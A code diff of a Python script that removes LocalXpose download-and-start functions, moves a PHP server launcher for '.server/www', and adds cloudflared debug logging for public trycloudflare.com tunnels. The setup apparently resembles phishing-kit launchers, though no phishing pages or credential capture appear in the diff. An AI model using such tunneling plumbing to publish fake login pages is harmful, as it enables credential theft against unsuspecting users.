@@ -70,40 +70,6 @@ def install_cloudflared():
 
     print("[*] Cloudflared installed successfully.")
 
-# Install LocalXpose
-def install_localxpose():
-    print("[*] Installing LocalXpose...")
-    if not os.path.exists(".server"):
-        os.makedirs(".server")
-
-    arch = platform.machine()
-    if arch == "x86_64":
-        url = "https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip"
-    elif "arm" in arch:
-        url = "https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip"
-    else:
-        print("[!] Unsupported architecture.")
-        return
-
-    loclx_zip_path = "loclx.zip"
-    subprocess.run(["curl", "-s", "-L", "-o", loclx_zip_path, url], check=True)
-    subprocess.run(["unzip", "-qq", loclx_zip_path, "-d", ".server"], check=True)
-    os.chmod(".server/loclx", 0o755)
-    os.remove(loclx_zip_path)
-
-    if not os.path.exists(".server/loclx"):
-        print("[!] LocalXpose installation failed. Please check your connection or try again.")
-        exit(1)
-
-    print("[*] LocalXpose installed successfully.")
-
-# Start a PHP server
-def start_php_server(port):
-    print(f"[*] Starting PHP server on port {port}...")
-    os.chdir(".server/www")
-    subprocess.Popen(["php", "-S", f"127.0.0.1:{port}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    os.chdir("../..")
-
 # Start Cloudflared and parse the tunnel URL
 def start_cloudflared(port):
     cloudflared_path = ".server/cloudflared"
@@ -122,6 +88,7 @@ def start_cloudflared(port):
 
         tunnel_url = None
         for line in process.stdout:
+            print(f"[Cloudflared Log] {line.strip()}")  # Log each line for debugging
             if "trycloudflare.com" in line:
                 tunnel_url = line.split(" ")[-1].strip()
                 break
@@ -130,26 +97,18 @@ def start_cloudflared(port):
             print(f"[+] Tunnel created successfully: {tunnel_url}")
         else:
             print("[!] Failed to create a tunnel. Check Cloudflared logs for more details.")
+            stderr_output = process.stderr.read()
+            print(f"[Cloudflared Error Log] {stderr_output.strip()}")
 
     except Exception as e:
         print(f"[!] An error occurred while starting Cloudflared: {e}")
 
-# Start LocalXpose
-def start_localxpose(port):
-    loclx_path = ".server/loclx"
-    if not os.path.exists(loclx_path):
-        print("[!] LocalXpose binary is missing. Attempting to reinstall...")
-        install_localxpose()
-
-    config = load_config()
-    token = config.get("localxpose_token")
-    if not token:
-        token = input("[*] Enter your LocalXpose token: ").strip()
-        config["localxpose_token"] = token
-        save_config(config)
-
-    print("[*] Starting LocalXpose...")
-    subprocess.Popen([loclx_path, "tunnel", "--raw-mode", "http", "--port", port, "--token", token], stdout=subprocess.PIPE)
+# Start a PHP server
+def start_php_server(port):
+    print(f"[*] Starting PHP server on port {port}...")
+    os.chdir(".server/www")
+    subprocess.Popen(["php", "-S", f"127.0.0.1:{port}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    os.chdir("../..")
 
 # Main menu
 def main_menu():
